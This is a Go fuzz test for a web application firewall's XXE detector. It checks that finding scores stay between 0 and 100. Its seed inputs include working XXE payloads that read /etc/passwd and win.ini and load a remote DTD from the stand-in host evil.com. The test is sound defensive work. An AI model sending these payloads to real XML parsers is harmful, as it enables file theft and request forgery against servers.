package xxe

import (
	"testing"

	"github.com/openloadbalancer/olb/internal/waf/detection"
)

func FuzzXXEDetector(f *testing.F) {
	f.Add("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>")
	f.Add("<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;")
	f.Add("<root>normal xml</root>")
	f.Add("")
	f.Add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>")
	f.Add("<?xml?>")
	f.Add("<!ENTITY xxe \"simple entity\">")

	d := New()

	f.Fuzz(func(t *testing.T, input string) {
		ctx := &detection.RequestContext{
			Body:        []byte(input),
			ContentType: "application/xml",
			BodyParams:  make(map[string]string),
			Headers:     make(map[string][]string),
			Cookies:     make(map[string]string),
		}
		findings := d.Detect(ctx)
		for _, finding := range findings {
			if finding.Score < 0 || finding.Score > 100 {
				t.Errorf("invalid score %d for input %q", finding.Score, input)
			}
		}
	})
}
